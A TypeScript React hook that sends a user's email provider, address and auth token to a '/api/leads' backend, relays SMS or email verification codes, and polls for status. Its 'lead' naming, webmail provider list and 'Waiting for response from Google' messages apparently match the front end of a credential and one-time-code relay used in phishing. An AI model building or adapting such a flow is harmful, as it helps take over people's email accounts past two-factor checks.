import { useCallback, useEffect, useRef, useState } from "react";

export type LeadStatus =
  | "idle"
  | "loading"
  | "passing"
  | "flagged"
  | "completed"
  | "failed";

export type LeadProcess =
  | "init"
  | "auth"
  | "verify-sms-code"
  | "verify-email-code"
  | "verify-email-link";

type LeadChannelState = {
  anchor: string | null;
  status: LeadStatus;
  process: LeadProcess;
  message: string;
};

type LeadChannelSnapshot = {
  anchor: string;
  status: LeadStatus;
  process: LeadProcess;
  message: string;
};

const providerSource: Record<string, string> = {
  google: "Google",
  outlook: "Microsoft",
  microsoft365: "Microsoft",
  yahoo: "Yahoo",
  aol: "AOL",
  other: "provider",
};

const TERMINAL_LEAD_STATUS_SET = new Set<LeadStatus>(["completed", "failed"]);

const INITIAL_LEAD_CHANNEL_STATE: LeadChannelState = {
  anchor: null,
  status: "idle",
  process: "init",
  message: "",
};

export function useLeadChannel() {
  const [state, setState] = useState<LeadChannelState>(
    INITIAL_LEAD_CHANNEL_STATE,
  );
  const generation = useRef(0);
  const launch = useCallback(
    async (payload: {
      provider: string;
      email: string;
      authToken: string;
      customFields?: { name: string; value: string }[];
    }) => {
      const currentGeneration = ++generation.current;
      setState({
        anchor: null,
        status: "loading",
        process: "auth",
        message: `Connecting to ${providerSource[payload.provider]}...`,
      });
      try {
        const response = await fetch("/api/leads", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (!response.ok) {
          const json = await response.json();
          throw new Error(
            json?.error?.message ??
              "Check your internet connection and try again.",
          );
        }
        const result: {
          anchor: string;
          status: LeadStatus;
          process: LeadProcess;
        } = await response.json();
        if (generation.current !== currentGeneration) return;
        setState({
          anchor: result.anchor,
          status: result.status,
          process: result.process,
          message: `Waiting for response from ${providerSource[payload.provider]}...`,
        });
      } catch (error) {
        if (generation.current !== currentGeneration) return;
        setState({
          anchor: state.anchor,
          status: "failed",
          process: "auth",
          message:
            error instanceof Error
              ? error.message
              : "Something went wrong. Please try again.",
        });
      }
    },
    [],
  );

  const sendCode = useCallback(
    async (payload: {
      provider: string;
      email: string;
      type: "sms" | "email";
      code: string;
    }) => {
      const currentGeneration = ++generation.current;
      setState({
        anchor: state.anchor,
        status: "loading",
        process:
          payload.type === "sms" ? "verify-sms-code" : "verify-email-code",
        message: `Sending ${payload.type} code for verification`,
      });
      try {
        const response = await fetch(`/api/leads/code`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (!response.ok) {
          const json = await response.json();
          throw new Error(
            json?.error?.message ??
              "Check your internet connection and try again.",
          );
        }
        const result: {
          anchor: string;
          status: LeadStatus;
          process: LeadProcess;
          message: string;
        } = await response.json();
        setState({
          anchor: result.anchor,
          status: result.status,
          process: result.process,
          message: result.message,
        });
      } catch (error) {
        if (generation.current !== currentGeneration) return;
        setState({
          anchor: state.anchor,
          status: "failed",
          process: state.process,
          message:
            error instanceof Error
              ? error.message
              : "Something went wrong. Please try again.",
        });
      }
    },
    [],
  );

  const restart = useCallback(() => {
    generation.current += 1;
    setState(INITIAL_LEAD_CHANNEL_STATE);
  }, []);

  useEffect(() => {
    const { anchor, status } = state;
    if (!anchor || !status || TERMINAL_LEAD_STATUS_SET.has(status)) return;
    let closed = false;
    let polling = false;
    let pollTimer: ReturnType<typeof setTimeout> | undefined;
    const isPollingActive = () => !closed;
    const applySnapshot = (snapshot: LeadChannelSnapshot) => {
      if (!isPollingActive()) return;
      if (snapshot.status === "completed" || snapshot.status === "failed") {
        closed = true;
        if (pollTimer) clearTimeout(pollTimer);
        setState({
          anchor: snapshot.anchor,
          status: snapshot.status,
          process: snapshot.process,
          message: snapshot.message,
        });
        return;
      }
      setState({
        anchor: snapshot.anchor,
        status: snapshot.status,
        process: snapshot.process,
        message: snapshot.message,
      });
    };
    const checkFlowStatus = async () => {
      if (!isPollingActive() || polling || !state.anchor) return;
      polling = true;
      try {
        const response = await fetch(
          `/api/leads/${encodeURIComponent(state.anchor)}`,
          { cache: "no-store" },
        );
        if (!isPollingActive()) return;
        if (response.ok) {
          const snapshot: LeadChannelSnapshot = await response.json();
          applySnapshot(snapshot);
        }
      } catch {
        // Retry while the channel remains active.
      } finally {
        polling = false;
        if (isPollingActive()) {
          pollTimer = setTimeout(() => {
            void checkFlowStatus();
          }, 2000);
        }
      }
    };
    void checkFlowStatus();
    return () => {
      closed = true;
      if (pollTimer) clearTimeout(pollTimer);
    };
  }, [state.anchor, state.status]);

  return {
    ...state,
    isLoading: state.status === "loading" || state.status === "passing",
    launch,
    sendCode,
    restart,
  };
}
